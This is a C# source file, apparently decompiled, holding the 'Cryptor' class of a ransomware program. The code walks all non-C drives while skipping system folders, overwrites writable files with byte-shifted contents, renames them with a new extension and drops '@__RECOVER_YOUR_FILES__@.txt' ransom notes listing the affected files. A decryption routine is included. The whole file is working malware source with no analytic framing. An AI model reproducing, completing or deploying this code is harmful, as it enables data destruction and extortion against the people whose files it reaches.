using System;
using System.Collections.Generic;
using System.IO;

namespace TimeTime;

public class Cryptor
{
	public static List<string> encr_files = new List<string>();

	public static void DropReadmes()
	{
		Settings.readmeText = Settings.readmeText.Replace("<filescount>", encr_files.Count.ToString() ?? "");
		string text = "";
		foreach (string encr_file in encr_files)
		{
			text = text + encr_file + "\r\n";
		}
		Settings.readmeText = Settings.readmeText.Replace("<files>", text);
		foreach (string encr_file2 in encr_files)
		{
			string directoryName = Path.GetDirectoryName(encr_file2);
			directoryName += "\\@__RECOVER_YOUR_FILES__@.txt";
			if (!File.Exists(directoryName))
			{
				File.WriteAllText(directoryName, Settings.readmeText);
			}
		}
	}

	public static void RenameAll()
	{
		foreach (string encr_file in encr_files)
		{
			if (File.Exists(encr_file))
			{
				try
				{
					File.Move(encr_file, encr_file + Settings.ext);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	public static void EncryptFile(string file)
	{
		byte[] array = File.ReadAllBytes(file);
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array2.Length; i++)
		{
			char c = (char)array[i];
			c = (char)(c + 1);
			byte b = (array2[i] = (byte)c);
		}
		File.WriteAllBytes(file, array2);
		encr_files.Add(file);
		File.Move(file, file + Settings.ext);
	}

	public static void EncryptDisks()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				if (driveInfo.IsReady && !driveInfo.Name.Contains("C"))
				{
					TryEncryptFolder(driveInfo.Name);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	private static List<string> DirSearch(string sDir)
	{
		List<string> list = new List<string>();
		try
		{
			if (sDir.Contains("AppData\\"))
			{
				return list;
			}
			if (sDir.Contains("Windows\\"))
			{
				return list;
			}
			if (sDir.Contains("Common Files\\"))
			{
				return list;
			}
			if (sDir.Contains("WindowsPowerShell\\"))
			{
				return list;
			}
			if (sDir.Contains("Microsoft\\Provisioning\\"))
			{
				return list;
			}
			if (sDir.Contains("ProgramData"))
			{
				return list;
			}
			if (sDir.Contains("Program Files"))
			{
				return list;
			}
			if (sDir.Contains("$"))
			{
				return list;
			}
			string[] files = Directory.GetFiles(sDir);
			foreach (string item in files)
			{
				list.Add(item);
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string sDir2 in directories)
			{
				list.AddRange(DirSearch(sDir2));
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	public static void TryEncryptFolder(string folder)
	{
		try
		{
			EncryptFolder(folder);
		}
		catch (Exception)
		{
		}
	}

	public static void EncryptFolder(string folder)
	{
		List<string> list = DirSearch(folder);
		foreach (string item in list)
		{
			try
			{
				if (!item.EndsWith(Settings.ext))
				{
					bool flag = false;
					bool flag2 = false;
					bool flag3 = new FileInfo(item).Attributes.HasFlag(FileAttributes.ReadOnly);
					using (FileStream fileStream = new FileStream(item, FileMode.Open))
					{
						flag2 = fileStream.CanRead;
						flag = fileStream.CanWrite;
					}
					if (!flag3 && flag && flag2)
					{
						EncryptFile(item);
					}
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static void DecryptFile(string file)
	{
		byte[] array = File.ReadAllBytes(file);
		byte[] array2 = new byte[array.Length];
		for (int i = 0; i < array2.Length; i++)
		{
			char c = (char)array[i];
			c = (char)(c - 1);
			byte b = (array2[i] = (byte)c);
		}
		File.WriteAllBytes(file, array2);
		File.Move(file, file.Substring(0, file.Length - Settings.ext.Length));
	}
}
